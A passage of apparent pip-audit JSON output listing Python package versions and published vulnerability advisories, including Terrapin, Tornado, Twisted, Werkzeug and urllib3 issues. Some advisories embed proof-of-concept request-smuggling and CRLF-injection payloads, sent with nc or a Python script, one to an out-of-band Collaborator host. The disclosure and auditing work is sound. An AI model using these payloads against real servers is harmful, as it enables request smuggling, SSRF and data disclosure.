(a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.  The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.  In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.  For more details see [https://terrapin-attack.com](https://terrapin-attack.com).   ### Impact  This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario."}]}, {"name": "passlib", "version": "1.7.4", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "periodictable", "version": "1.6.1", "vulns": []}, {"name": "pexpect", "version": "4.9.0", "vulns": []}, {"name": "phply", "version": "1.2.6", "vulns": []}, {"name": "pillow", "version": "12.0.0", "vulns": []}, {"name": "pip", "version": "24.0", "vulns": [{"id": "CVE-2025-8869", "fix_versions": ["25.3"], "aliases": ["GHSA-4xh5-x5gv-qwph"], "description": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.10.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "pipx", "version": "1.4.3", "vulns": []}, {"name": "platformdirs", "version": "4.5.0", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "ply", "version": "3.11", "vulns": []}, {"name": "posthog", "version": "5.4.0", "vulns": []}, {"name": "propcache", "version": "0.4.1", "vulns": []}, {"name": "protobuf", "version": "6.33.1", "vulns": []}, {"name": "psutil", "version": "7.1.3", "vulns": []}, {"name": "psycopg2-binary", "version": "2.9.11", "vulns": []}, {"name": "ptyprocess", "version": "0.7.0", "vulns": []}, {"name": "publicsuffix2", "version": "2.20191221", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "py-spy", "version": "0.4.1", "vulns": []}, {"name": "pyasn1", "version": "0.6.1", "vulns": []}, {"name": "pyasn1-modules", "version": "0.4.2", "vulns": []}, {"name": "pyasyncore", "version": "1.0.2", "vulns": []}, {"name": "pybase64", "version": "1.4.2", "vulns": []}, {"name": "pycairo", "version": "1.25.1", "vulns": []}, {"name": "pycparser", "version": "2.23", "vulns": []}, {"name": "pycups", "version": "2.0.1", "vulns": []}, {"name": "pydantic", "version": "2.12.5", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "pydantic-settings", "version": "2.12.0", "vulns": []}, {"name": "pyenchant", "version": "3.2.2", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pygobject", "version": "3.48.2", "vulns": []}, {"name": "pyhamcrest", "version": "2.1.0", "vulns": []}, {"name": "pyinotify", "version": "0.9.6", "vulns": []}, {"name": "pyjwt", "version": "2.10.1", "vulns": []}, {"name": "pykerberos", "version": "1.1.14", "vulns": []}, {"name": "pylibacl", "version": "0.7.0", "vulns": []}, {"name": "pymupdf", "version": "1.26.7", "vulns": []}, {"name": "pynacl", "version": "1.5.0", "vulns": [{"id": "CVE-2025-69277", "fix_versions": ["1.6.2"], "aliases": ["GHSA-mrfv-m5wm-5w6w"], "description": "libsodium before ad3004e, in atypical use cases involving certain custom cryptography or untrusted data to crypto_core_ed25519_is_valid_point, mishandles checks for whether an elliptic curve point is valid because it sometimes allows points that aren't in the main cryptographic group.  This advisoory lists packages in the GitHub Advisory Database's [supported ecosystems](https://github.com/github/advisory-database?tab=readme-ov-file#supported-ecosystems) that are affected by this vulnerability due to a vulnerable dependency."}]}, {"name": "pynvim", "version": "0.5.0", "vulns": []}, {"name": "pyopenssl", "version": "23.2.0", "vulns": []}, {"name": "pyparsing", "version": "3.2.5", "vulns": []}, {"name": "pyperclip", "version": "1.8.2", "vulns": []}, {"name": "pypika", "version": "0.48.9", "vulns": []}, {"name": "pyproject-hooks", "version": "1.2.0", "vulns": []}, {"name": "pyqt5", "version": "5.15.10", "vulns": []}, {"name": "pyqt5-sip", "version": "12.13.0", "vulns": []}, {"name": "pyqtwebengine", "version": "5.15.6", "vulns": []}, {"name": "pyrsistent", "version": "0.20.0", "vulns": []}, {"name": "pyserial", "version": "3.5", "vulns": []}, {"name": "pytest", "version": "9.0.1", "vulns": []}, {"name": "pytest-asyncio", "version": "1.3.0", "vulns": []}, {"name": "pytest-cov", "version": "7.0.0", "vulns": []}, {"name": "pytest-timeout", "version": "2.4.0", "vulns": []}, {"name": "python-apt", "skip_reason": "Dependency not found on PyPI and could not be audited: python-apt (2.7.7+ubuntu5.1)"}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-debian", "skip_reason": "Dependency not found on PyPI and could not be audited: python-debian (0.1.49+ubuntu2)"}, {"name": "python-dotenv", "version": "1.2.1", "vulns": []}, {"name": "python-multipart", "version": "0.0.21", "vulns": []}, {"name": "python-xlib", "version": "0.33", "vulns": []}, {"name": "pytz", "version": "2024.1", "vulns": []}, {"name": "pywinrm", "version": "0.4.3", "vulns": []}, {"name": "pyxattr", "version": "0.8.1", "vulns": []}, {"name": "pyxdg", "version": "0.28", "vulns": []}, {"name": "pyyaml", "version": "6.0.3", "vulns": []}, {"name": "qtpy", "version": "2.4.1", "vulns": []}, {"name": "rapidfuzz", "version": "3.6.2", "vulns": []}, {"name": "referencing", "version": "0.37.0", "vulns": []}, {"name": "regex", "version": "2025.11.3", "vulns": []}, {"name": "requests", "version": "2.32.5", "vulns": []}, {"name": "requests-mock", "version": "1.12.1", "vulns": []}, {"name": "requests-ntlm", "version": "1.1.0", "vulns": []}, {"name": "requests-oauthlib", "version": "2.0.0", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "requirements-parser", "version": "0.13.0", "vulns": []}, {"name": "resolvelib", "version": "1.0.1", "vulns": []}, {"name": "rich", "version": "14.2.0", "vulns": []}, {"name": "rpds-py", "version": "0.30.0", "vulns": []}, {"name": "rpm", "skip_reason": "Dependency not found on PyPI and could not be audited: rpm (4.18.2)"}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "ruamel-yaml", "version": "0.17.21", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.8", "vulns": []}, {"name": "ruff", "version": "0.14.6", "vulns": []}, {"name": "safetensors", "version": "0.7.0", "vulns": []}, {"name": "scikit-learn", "version": "1.7.2", "vulns": []}, {"name": "scipy", "version": "1.16.3", "vulns": []}, {"name": "screen-resolution-extra", "skip_reason": "Dependency not found on PyPI and could not be audited: screen-resolution-extra (0.0.0)"}, {"name": "selinux", "skip_reason": "Dependency not found on PyPI and could not be audited: selinux (3.5)"}, {"name": "sentence-transformers", "version": "5.1.2", "vulns": []}, {"name": "service-identity", "version": "24.1.0", "vulns": []}, {"name": "setuptools", "version": "80.9.0", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "simpleeval", "version": "1.0.3", "vulns": []}, {"name": "simplejson", "version": "3.19.2", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "smmap", "version": "5.0.2", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.5", "vulns": []}, {"name": "sse-starlette", "version": "3.0.4", "vulns": []}, {"name": "ssh-import-id", "version": "5.11", "vulns": []}, {"name": "starlette", "version": "0.50.0", "vulns": []}, {"name": "stevedore", "version": "5.6.0", "vulns": []}, {"name": "sympy", "version": "1.14.0", "vulns": []}, {"name": "systemd-python", "version": "235", "vulns": []}, {"name": "tenacity", "version": "9.1.2", "vulns": []}, {"name": "textual", "version": "6.7.1", "vulns": []}, {"name": "textual-dev", "version": "1.8.0", "vulns": []}, {"name": "textual-serve", "version": "1.1.3", "vulns": []}, {"name": "threadpoolctl", "version": "3.6.0", "vulns": []}, {"name": "tokenizers", "version": "0.22.1", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.3.0", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tomlkit", "version": "0.13.3", "vulns": []}, {"name": "torch", "version": "2.9.1", "vulns": []}, {"name": "tornado", "version": "6.4", "vulns": [{"id": "GHSA-753j-mpmx-qq6g", "fix_versions": ["6.4.1"], "aliases": [], "description": "### Summary When Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.  ### PoC 0. Install Tornado. 1. Start a simple Tornado server that echoes each received request's body: ```bash cat << EOF > server.py import asyncio import tornado  class MainHandler(tornado.web.RequestHandler):     def post(self):         self.write(self.request.body)  async def main():     tornado.web.Application([(r\"/\", MainHandler)]).listen(8000)     await asyncio.Event().wait()  asyncio.run(main()) EOF python3 server.py & ``` 2. Send a valid chunked request: ```bash printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000 ``` 3. Observe that the response is as expected: ``` HTTP/1.1 200 OK Server: TornadoServer/6.3.3 Content-Type: text/html; charset=UTF-8 Date: Sat, 07 Oct 2023 17:32:05 GMT Content-Length: 1  Z ``` 4. Send a request with two `Transfer-Encoding: chunked` headers: ``` printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n' | nc localhost 8000 ``` 5. Observe the strange response: ``` HTTP/1.1 200 OK Server: TornadoServer/6.3.3 Content-Type: text/html; charset=UTF-8 Date: Sat, 07 Oct 2023 17:35:40 GMT Content-Length: 0  HTTP/1.1 400 Bad Request  ``` This is because Tornado believes that the request has no message body, so it tries to interpret `1\\r\\nZ\\r\\n0\\r\\n\\r\\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.  ### Impact Anyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization. "}, {"id": "GHSA-w235-7p84-xx57", "fix_versions": ["6.4.1"], "aliases": [], "description": "### Summary Tornado\u2019s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.  ### Details When an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\\r) or line feed (\\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.  This behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.  This issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl\u2019s documentation states:  > The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.  pycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado\u2019s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.  ### PoC The issue can be reproduced using the following script:  ```python import asyncio  from tornado import httpclient from tornado import curl_httpclient  async def main():     http_client = curl_httpclient.CurlAsyncHTTPClient()      request = httpclient.HTTPRequest(         # Burp Collaborator payload         \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",         method=\"POST\",         body=\"body\",         # Injected header using CRLF characters         headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}     )      response = await http_client.fetch(request)     print(response.body)      http_client.close()  if __name__ == \"__main__\":     asyncio.run(main()) ```  When the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:  ```http POST / HTTP/1.1 Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com User-Agent: Mozilla/5.0 (compatible; pycurl) Accept: */* Accept-Encoding: gzip,deflate Foo: Bar Header: Injected Content-Length: 4 Content-Type: application/x-www-form-urlencoded  body ```  The attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:  ```http POST /attacker-controlled-url HTTP/1.1 Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com Content-Length: 4 Content-Type: application/x-www-form-urlencoded  body ```  ### Impact Applications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities."}, {"id": "CVE-2025-47287", "fix_versions": ["6.5"], "aliases": ["GHSA-7cx3-6m66-7c5m"], "description": "### Summary  When Tornado's ``multipart/form-data`` parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.  ### Affected versions  All versions of Tornado prior to 6.5 are affected. The vulnerable parser is enabled by default.  ### Solution  Upgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking `Content-Type: multipart/form-data` in a proxy."}, {"id": "CVE-2024-52804", "fix_versions": ["6.4.2"], "aliases": ["GHSA-8w49-h785-mj3c"], "description": "The algorithm used for parsing HTTP cookies in Tornado versions prior to 6.4.2 sometimes has quadratic complexity, leading to excessive CPU consumption when parsing maliciously-crafted cookie headers. This parsing occurs in the event loop thread and may block the processing of other requests.  See also CVE-2024-7592 for a similar vulnerability in cpython."}]}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "transformers", "version": "4.57.1", "vulns": []}, {"name": "translate-toolkit", "version": "3.12.2", "vulns": []}, {"name": "tree-sitter", "version": "0.20.1", "vulns": []}, {"name": "tree-sitter-languages", "version": "1.9.1", "vulns": []}, {"name": "triton", "version": "3.5.1", "vulns": []}, {"name": "twisted", "version": "24.3.0", "vulns": [{"id": "PYSEC-2024-75", "fix_versions": ["24.7.0rc1"], "aliases": ["GHSA-cf56-g6w6-pqq2", "CVE-2024-41810"], "description": "Twisted is an event-based framework for internet applications, supporting Python 3.6+. The `twisted.web.util.redirectTo` function contains an HTML injection vulnerability. If application code allows an attacker to control the redirect URL this vulnerability may result in Reflected Cross-Site Scripting (XSS) in the redirect response HTML body. This vulnerability is fixed in 24.7.0rc1."}, {"id": "CVE-2024-41671", "fix_versions": ["24.7.0rc1"], "aliases": ["GHSA-c8m8-j448-xjx7"], "description": "### Summary  The HTTP 1.0 and 1.1 server provided by twisted.web could process pipelined HTTP requests out-of-order, possibly resulting in information disclosure.  ### PoC 0. Start a fresh Debian container: ```sh docker run --workdir /repro --rm -it debian:bookworm-slim ``` 1. Install twisted and its dependencies: ```sh apt -y update && apt -y install ncat git python3 python3-pip \\     && git clone --recurse-submodules https://github.com/twisted/twisted \\     && cd twisted \\     && pip3 install --break-system-packages . ``` 2. Run a twisted.web HTTP server that echos received requests' methods. e.g., the following: ```python from twisted.web import server, resource from twisted.internet import reactor  class TheResource(resource.Resource):     isLeaf = True      def render_GET(self, request) -> bytes:         return b\"GET\"      def render_POST(self, request) -> bytes:         return b\"POST\"  site = server.Site(TheResource()) reactor.listenTCP(80, site) reactor.run() ``` 3. Send it a POST request with a chunked message body, pipelined with another POST request, wait a second, then send a GET request on the same connection: ```sh (printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nContent-Length: 0\\r\\n\\r\\n'; sleep 1; printf 'GET / HTTP/1.1\\r\\n\\r\\n'; sleep 1) | nc localhost 80 ``` 4. Observe that the responses arrive out of order: ``` HTTP/1.1 200 OK Server: TwistedWeb/24.3.0.post0 Date: Tue, 09 Jul 2024 06:19:41 GMT Content-Length: 5 Content-Type: text/html  POST HTTP/1.1 200 OK Server: TwistedWeb/24.3.0.post0 Date: Tue, 09 Jul 2024 06:19:42 GMT Content-Length: 4 Content-Type: text/html  GET HTTP/1.1 200 OK Server: TwistedWeb/24.3.0.post0 Date: Tue, 09 Jul 2024 06:19:42 GMT Content-Length: 5 Content-Type: text/html  POST ```  ### Impact See [GHSA-xc8x-vp79-p3wm](https://github.com/twisted/twisted/security/advisories/GHSA-xc8x-vp79-p3wm). Further, for instances of twisted.web HTTP servers deployed behind reverse proxies that implement connection pooling, it may be possible for remote attackers to receive responses intended for other clients of the twisted.web server."}]}, {"name": "typer", "version": "0.20.0", "vulns": []}, {"name": "types-requests", "version": "2.32.4.20250913", "vulns": []}, {"name": "types-toml", "version": "0.10.8.20240310", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "tzdata", "version": "2025.3", "vulns": []}, {"name": "ubuntu-drivers-common", "skip_reason": "Dependency not found on PyPI and could not be audited: ubuntu-drivers-common (0.0.0)"}, {"name": "ubuntu-pro-client", "skip_reason": "Dependency not found on PyPI and could not be audited: ubuntu-pro-client (8001)"}, {"name": "uc-micro-py", "version": "1.0.3", "vulns": []}, {"name": "ufw", "skip_reason": "Dependency not found on PyPI and could not be audited: ufw (0.36.2)"}, {"name": "unattended-upgrades", "skip_reason": "Dependency not found on PyPI and could not be audited: unattended-upgrades (0.1)"}, {"name": "urllib3", "version": "2.6.2", "vulns": [{"id": "CVE-2026-21441", "fix_versions": ["2.6.3"], "aliases": ["GHSA-38jv-5279-wg99"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.  However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).  ### Affected usages  Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.   ### Remediation  Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.  If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source."}]}, {"name": "urwid", "version": "2.6.10", "vulns": []}, {"name": "usb-creator", "skip_reason": "Dependency not found on PyPI and could not be audited: usb-creator (0.3.16)"}, {"name": "userpath", "version": "1.9.1", "vulns": []}, {"name": "uvicorn", "version": "0.38.0", "vulns": []}, {"name": "uvloop", "version": "0.22.1", "vulns": []}, {"name": "vobject", "version": "0.9.6.1", "vulns": []}, {"name": "wadllib", "version": "1.3.6", "vulns": []}, {"name": "watchdog", "version": "6.0.0", "vulns": []}, {"name": "watchfiles", "version": "1.1.1", "vulns": []}, {"name": "wcwidth", "version": "0.2.5", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websocket-client", "version": "1.9.0", "vulns": []}, {"name": "websockets", "version": "15.0.1", "vulns": []}, {"name": "werkzeug", "version": "3.0.1", "vulns": [{"id": "CVE-2024-34069", "fix_versions": ["3.0.3"], "aliases": ["GHSA-2g68-c3qc-8985"], "description": "The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger."}, {"id": "CVE-2024-49766", "fix_versions": ["3.0.6"], "aliases": ["GHSA-f9vj-2wh5-fj8j"], "description": "On Python < 3.11 on Windows, `os.path.isabs()` does not catch UNC paths like `//server/share`. Werkzeug's `safe_join()` relies on this check, and so can produce a path that is not safe, potentially allowing unintended access to data. Applications using Python >= 3.11, or not using Windows, are not vulnerable."}, {"id": "CVE-2024-49767", "fix_versions": ["3.0.6"], "aliases": ["GHSA-q34m-jh98-gwm2"], "description": "Applications using Werkzeug to parse `multipart/form-data` requests are vulnerable to resource exhaustion. A specially crafted form body can bypass the `Request.max_form_memory_size` setting.   The `Request.max_content_length` setting, as well as resource limits provided by deployment software and platforms, are also available to limit the resources used during a request. This vulnerability does not affect those settings. All three types of limits should be considered and set appropriately when deploying an application."}, {"id": "CVE-2025-66221", "fix_versions": ["3.1.4"], "aliases": ["GHSA-hgf8-39gv-g3f2"], "description": "Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely."}, {"id": "CVE-2026-21860", "fix_versions": ["3.1.5"], "aliases": ["GHSA-87hc-h4r5-73f7"], "description": "Werkzeug's `safe_join` function allows path segments with Windows device names that have file extensions or trailing spaces. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. Windows still accepts them with any file extension, such as `CON.txt`, or trailing spaces such as `CON `.  This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the fix failed to account for compound extensions such as `CON.txt.html` or trailing spaces. It also missed some additional special names.  `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely."}]}, {"name": "wheel", "version": "0.42.0", "vulns": []}, {"name": "wsproto", "version": "1.2.0", "vulns": []}, {"name": "xdg", "version": "5", "vulns": []}, {"name": "xkit", "skip_reason": "Dependency not found on PyPI and could not be audited: xkit (0.0.0)"}, {"name": "xmltodict", "version": "0.13.0", "vulns": []}, {"name": "xxhash", "version": "3.6.0", "vulns": []}, {"name": "yarl", "version": "1.22.0", "vulns": []}, {"name": "yq", "version": "3.1.0", "vulns": []}, {"name": "zipp", "version": "3.23.0", "vulns": []}, {"name": "zope-interface", "version": "6.1", "vulns": []}, {"name": "zstandard", "version": "0.25.0", "vulns": []}], "fixes": []}
